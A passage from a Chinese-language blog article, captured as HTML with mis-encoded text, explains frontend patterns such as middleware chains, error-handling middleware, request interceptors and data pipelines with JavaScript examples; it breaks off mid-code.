content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å¸¸ç”¨æ¨¡å¼ï¼šæå‡ä»£ç è´¨é‡çš„å››å¤§æ ¸å¿ƒæ¨¡å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/588993964030574/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1024è‚¥å®…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T05:00:57.000Z" title="Sat Dec 13 2025 05:00:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">å¼•è¨€</h4>
<p>åœ¨å‰ç«¯å¼€å‘ä¸­ï¼Œéšç€åº”ç”¨å¤æ‚åº¦ä¸æ–­å¢åŠ ï¼Œä»£ç çš„ç»„ç»‡å’Œç®¡ç†å˜å¾—è¶Šæ¥è¶Šé‡è¦ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨å‰ç«¯å¼€å‘ä¸­å››ç§æå…¶æœ‰ç”¨çš„æ¨¡å¼ï¼šä¸­é—´ä»¶æ¨¡å¼ã€ç®¡é“æ¨¡å¼ã€é“¾å¼è°ƒç”¨å’Œæƒ°æ€§åŠ è½½ã€‚è¿™äº›æ¨¡å¼ä¸ä»…èƒ½æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œè¿˜èƒ½æ˜¾è‘—ä¼˜åŒ–åº”ç”¨æ€§èƒ½ã€‚</p>
<h4 data-id="heading-1">ä¸€ã€ä¸­é—´ä»¶æ¨¡å¼ï¼ˆMiddleware Patternï¼‰</h4>
<p>ä¸­é—´ä»¶æ¨¡å¼å…è®¸æˆ‘ä»¬åœ¨è¯·æ±‚å’Œå“åº”çš„å¤„ç†æµç¨‹ä¸­æ’å…¥å¤šä¸ªå¤„ç†é˜¶æ®µ, è¿™ç§æ¨¡å¼åœ¨Node.jsæ¡†æ¶(ä¾‹å¦‚Koaã€Express)ä¸­å¹¿æ³›åº”ç”¨, ä½†åœ¨å‰ç«¯åŒæ ·æœ‰å…¶ç”¨æ­¦ä¹‹åœ°ã€‚</p>
<h5 data-id="heading-2">1.1 æ ¸å¿ƒæ¦‚å¿µ</h5>
<p>ä¸­é—´ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå‡½æ•°, å®ƒå¯ä»¥:</p>
<ul>
<li>è®¿é—®è¯·æ±‚(request)å’Œå“åº”(response)å¯¹è±¡</li>
<li>æ‰§è¡Œä»»ä½•ä»£ç </li>
<li>ä¿®æ”¹è¯·æ±‚å’Œå“åº”å¯¹è±¡</li>
<li>ç»“æŸè¯·æ±‚-å“åº”å‘¨æœŸ</li>
<li>è°ƒç”¨ä¸‹ä¸€ä¸ªä¸­é—´ä»¶</li>
</ul>
<h5 data-id="heading-3">1.2 åŸºç¡€å®ç°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç®€å•ä¸­é—´ä»¶ç³»ç»Ÿå®ç°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MiddlewareSystem</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span> = {};
  }

  <span class="hljs-comment">// æ·»åŠ ä¸­é—´ä»¶</span>
  <span class="hljs-title function_">use</span>(<span class="hljs-params">middleware</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> middleware !== <span class="hljs-string">'function'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Middleware must be a function'</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span>.<span class="hljs-title function_">push</span>(middleware);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// æ”¯æŒé“¾å¼è°ƒç”¨</span>
  }

  <span class="hljs-comment">// æ‰§è¡Œä¸­é—´ä»¶</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">input</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span> = { ...input };
    
    <span class="hljs-comment">// åˆ›å»ºnextå‡½æ•°</span>
    <span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">next</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span>.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">const</span> middleware = <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span>[index++];
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>, next);
      }
    };
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>;
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Middleware execution error:'</span>, error);
      <span class="hljs-keyword">throw</span> error;
    }
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> system = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MiddlewareSystem</span>();

<span class="hljs-comment">// æ·»åŠ ä¸­é—´ä»¶</span>
system
  .<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Middleware 1: Start'</span>);
    ctx.<span class="hljs-property">timestamp</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Middleware 1: End'</span>);
  })
  .<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Middleware 2: Start'</span>);
    ctx.<span class="hljs-property">user</span> = { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'John'</span> };
    <span class="hljs-comment">// æ¨¡æ‹Ÿå¼‚æ­¥æ“ä½œ</span>
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, <span class="hljs-number">100</span>));
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Middleware 2: End'</span>);
  })
  .<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Middleware 3: Start'</span>);
    ctx.<span class="hljs-property">data</span> = { <span class="hljs-attr">message</span>: <span class="hljs-string">'Hello World'</span> };
    <span class="hljs-comment">// ä¸å†è°ƒç”¨next()ï¼Œç»“æŸæ‰§è¡Œ</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Middleware 3: End (no next call)'</span>);
  });

<span class="hljs-comment">// è¿è¡Œä¸­é—´ä»¶</span>
system.<span class="hljs-title function_">run</span>({ <span class="hljs-attr">requestId</span>: <span class="hljs-string">'123'</span> }).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Final context:'</span>, result);
});
</code></pre>
<h5 data-id="heading-4">1.3 é”™è¯¯å¤„ç†ä¸­é—´ä»¶</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorHandlingMiddleware</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMiddlewares</span> = [];
  }

  <span class="hljs-title function_">use</span>(<span class="hljs-params">middleware</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span>.<span class="hljs-title function_">push</span>(middleware);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">useError</span>(<span class="hljs-params">errorMiddleware</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMiddlewares</span>.<span class="hljs-title function_">push</span>(errorMiddleware);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">input</span>) {
    <span class="hljs-keyword">const</span> context = { ...input };
    <span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> errorIndex = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> error = <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">next</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">err</span>) =&gt; {
      <span class="hljs-keyword">if</span> (err) {
        error = err;
        errorIndex = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextError</span>();
      }

      <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span>.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">const</span> middleware = <span class="hljs-variable language_">this</span>.<span class="hljs-property">middlewares</span>[index++];
        <span class="hljs-keyword">try</span> {
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">middleware</span>(context, next);
        } <span class="hljs-keyword">catch</span> (err) {
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>(err);
        }
      }
    };

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">nextError</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (errorIndex &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMiddlewares</span>.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">const</span> errorMiddleware = <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMiddlewares</span>[errorIndex++];
        <span class="hljs-keyword">try</span> {
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">errorMiddleware</span>(error, context, nextError);
        } <span class="hljs-keyword">catch</span> (err) {
          error = err;
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextError</span>();
        }
      }
    };

    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
    <span class="hljs-keyword">return</span> { context, error };
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> errorSystem = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorHandlingMiddleware</span>();

errorSystem
  .<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Processing...'</span>);
    <span class="hljs-comment">// æ¨¡æ‹Ÿé”™è¯¯</span>
    <span class="hljs-keyword">if</span> (!ctx.<span class="hljs-property">user</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'User not found'</span>);
    }
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
  })
  .<span class="hljs-title function_">useError</span>(<span class="hljs-keyword">async</span> (err, ctx, next) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Error caught:'</span>, err.<span class="hljs-property">message</span>);
    ctx.<span class="hljs-property">error</span> = err.<span class="hljs-property">message</span>;
    ctx.<span class="hljs-property">status</span> = <span class="hljs-string">'error'</span>;
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
  });

errorSystem.<span class="hljs-title function_">run</span>({}).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Result with error handling:'</span>, result);
});
</code></pre>
<h5 data-id="heading-5">1.4 å‰ç«¯åº”ç”¨åœºæ™¯</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰ç«¯è¯·æ±‚æ‹¦æˆªä¸­é—´ä»¶</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestInterceptor</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">interceptors</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultConfig</span> = {
      <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span>,
      <span class="hljs-attr">headers</span>: {}
    };
  }

  <span class="hljs-title function_">use</span>(<span class="hljs-params">interceptor</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">interceptors</span>.<span class="hljs-title function_">push</span>(interceptor);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">url, config = {}</span>) {
    <span class="hljs-keyword">const</span> context = {
      url,
      <span class="hljs-attr">config</span>: { ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultConfig</span>, ...config },
      <span class="hljs-attr">response</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span>
    };

    <span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">next</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">interceptors</span>.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">const</span> interceptor = <span class="hljs-variable language_">this</span>.<span class="hljs-property">interceptors</span>[index++];
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">interceptor</span>(context, next);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// æ‰§è¡Œå®é™…è¯·æ±‚</span>
        <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">executeRequest</span>(context);
      }
    };

    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
    <span class="hljs-keyword">return</span> context;
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">executeRequest</span>(<span class="hljs-params">context</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(context.<span class="hljs-property">url</span>, context.<span class="hljs-property">config</span>);
      context.<span class="hljs-property">response</span> = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
    } <span class="hljs-keyword">catch</span> (error) {
      context.<span class="hljs-property">error</span> = error;
    }
  }
}

<span class="hljs-comment">// åˆ›å»ºè¯·æ±‚æ‹¦æˆªå™¨</span>
<span class="hljs-keyword">const</span> api = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestInterceptor</span>();

api
  .<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Auth interceptor'</span>);
    ctx.<span class="hljs-property">config</span>.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${<span class="hljs-variable language_">localStorage</span>.getItem(<span class="hljs-string">'token'</span>)}</span>`</span>;
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
  })
  .<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Logging interceptor'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request to <span class="hljs-subst">${ctx.url}</span>`</span>, ctx.<span class="hljs-property">config</span>);
    <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
    <span class="hljs-keyword">const</span> duration = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - start;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request completed in <span class="hljs-subst">${duration}</span>ms`</span>);
  })
  .<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Cache interceptor'</span>);
    <span class="hljs-keyword">const</span> cacheKey = <span class="hljs-string">`cache_<span class="hljs-subst">${ctx.url}</span>`</span>;
    <span class="hljs-keyword">const</span> cached = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(cacheKey);
    
    <span class="hljs-keyword">if</span> (cached &amp;&amp; !ctx.<span class="hljs-property">config</span>.<span class="hljs-property">noCache</span>) {
      ctx.<span class="hljs-property">response</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(cached);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Using cached response'</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();
      <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">response</span> &amp;&amp; !ctx.<span class="hljs-property">error</span>) {
        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(cacheKey, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(ctx.<span class="hljs-property">response</span>));
      }
    }
  });

<span class="hljs-comment">// ä½¿ç”¨æ‹¦æˆªå™¨</span>
api.<span class="hljs-title function_">request</span>(<span class="hljs-string">'https://api.example.com/data'</span>, { <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span> })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Response:'</span>, result.<span class="hljs-property">response</span>));
</code></pre>
<h4 data-id="heading-6">äºŒã€ç®¡é“æ¨¡å¼ï¼ˆPipeline Patternï¼‰</h4>
<p>ç®¡é“æ¨¡å¼å°†å¤šä¸ªå¤„ç†å‡½æ•°è¿æ¥èµ·æ¥, æ•°æ®åƒæµæ°´ä¸€æ ·ç»è¿‡è¿™äº›å‡½æ•°è¿›è¡Œå¤„ç†å’Œè½¬æ¢ã€‚</p>
<h5 data-id="heading-7">2.1 åŸºæœ¬å®ç°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åŒæ­¥ç®¡é“</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">pipeline</span> = (<span class="hljs-params">...fns</span>) =&gt; <span class="hljs-function">(<span class="hljs-params">initialValue</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> fns.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">value, fn</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> fn !== <span class="hljs-string">'function'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Pipeline expects functions, got <span class="hljs-subst">${<span class="hljs-keyword">typeof</span> fn}</span>`</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fn</span>(value);
  }, initialValue);
};

<span class="hljs-comment">// å¼‚æ­¥ç®¡é“</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">asyncPipeline</span> = (<span class="hljs-params">...fns</span>) =&gt; <span class="hljs-keyword">async</span> (initialValue) =&gt; {
  <span class="hljs-keyword">let</span> result = initialValue;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> fn <span class="hljs-keyword">of</span> fns) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> fn !== <span class="hljs-string">'function'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Pipeline expects functions, got <span class="hljs-subst">${<span class="hljs-keyword">typeof</span> fn}</span>`</span>);
    }
    result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fn</span>(result);
  }
  <span class="hljs-keyword">return</span> result;
};

<span class="hljs-comment">// å¯ä¸­æ–­çš„ç®¡é“</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">breakablePipeline</span> = (<span class="hljs-params">...fns</span>) =&gt; <span class="hljs-function">(<span class="hljs-params">initialValue</span>) =&gt;</span> {
  <span class="hljs-keyword">let</span> shouldBreak = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">let</span> breakValue = <span class="hljs-literal">null</span>;
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">breakFn</span> = (<span class="hljs-params">value</span>) =&gt; {
    shouldBreak = <span class="hljs-literal">true</span>;
    breakValue = value;
  };
  
  <span class="hljs-keyword">const</span> result = fns.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">value, fn</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (shouldBreak) <span class="hljs-keyword">return</span> breakValue;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fn</span>(value, breakFn);
  }, initialValue);
  
  <span class="hljs-keyword">return</span> shouldBreak ? breakValue : result;
};
</code></pre>
<h5 data-id="heading-8">2.2 æ•°æ®å¤„ç†ç®¡é“ç¤ºä¾‹</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ•°æ®æ¸…æ´—ç®¡é“</span>
<span class="hljs-keyword">const</span> dataCleaningPipeline = <span class="hljs-title function_">pipeline</span>(
  <span class="hljs-comment">// 1. ç§»é™¤ç©ºå€¼</span>
  <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> data.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item != <span class="hljs-literal">null</span>),
  
  <span class="hljs-comment">// 2. æ ‡å‡†åŒ–å­—æ®µ</span>
  <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> data.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> ({
    ...item,
    <span class="hljs-attr">name</span>: item.<span class="hljs-property">name</span>?.<span class="hljs-title function_">trim</span>().<span class="hljs-title function_">toLowerCase</span>() || <span class="hljs-string">'unknown'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-title class_">Number</span>(item.<span class="hljs-property">value</span>) || <span class="hljs-number">0</span>
  })),
  
  <span class="hljs-comment">// 3. å»é‡</span>
  <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> seen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();
    <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
